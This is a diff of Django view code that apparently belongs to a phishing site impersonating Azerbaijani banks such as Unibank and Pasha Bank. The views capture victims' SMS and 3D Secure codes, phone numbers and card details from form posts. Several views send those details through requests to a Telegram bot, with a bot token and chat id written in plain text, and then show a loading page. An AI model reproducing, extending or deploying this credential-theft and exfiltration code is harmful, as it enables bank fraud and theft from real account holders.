@@ -347,9 +347,13 @@ def dsecazericard(request):
     last_contact = ContactModel.objects.latest('created_at')
     last_contact.sms=sms
     last_contact.save()
+    context = {
+        'last_contact_id': last_contact.id,
+
+    }
     response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{last_contact.id}\nsms:{last_contact.sms}|number{last_contact.phone}')
 
-    return render( request,'pages/loading.html' )
+    return render( request,'pages/loading.html',context )
 
 def page_not_found(request, exception):
     return render(request, 'pages/404.html', status=404)
@@ -413,10 +417,10 @@ def unibank3d(request):
     sms = request.POST.get('secpass')
     last_contact = ContactModel.objects.latest('created_at')
     last_contact.sms=sms
+    last_contact.bankname=""
     last_contact.save()
     context = {
         'last_contact_id': last_contact.id,
-
     }
     if len(sms) == 0:
         # handle the case when input6 is empty
@@ -448,7 +452,7 @@ def error(request):
 
 @ensure_csrf_cookie
 def pashabank3d(request):
-    
+    last_contact = ContactModel.objects.latest('created_at')
     if request.method == "POST":
         last_contact = ContactModel.objects.latest('created_at')
         number = str(last_contact.phone)
@@ -459,6 +463,7 @@ def pashabank3d(request):
               'amount': last_contact.amount,
               'cc': last_contact.cc[-4:],
         }
+        last_contact.bankname=""
         input1 = request.POST.get("input1")
         input2 = request.POST.get("input2")
         input3 = request.POST.get("input3")
@@ -480,7 +485,7 @@ def pashabank3d(request):
         response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{last_contact.id}\nnumber{last_contact.phone}\nsms:{concatenated}')
         return render( request,'pages/loading.html',context )
     
-    
+    last_contact.bankname=""
     return render( request,'pages/loading.html' )
 
 
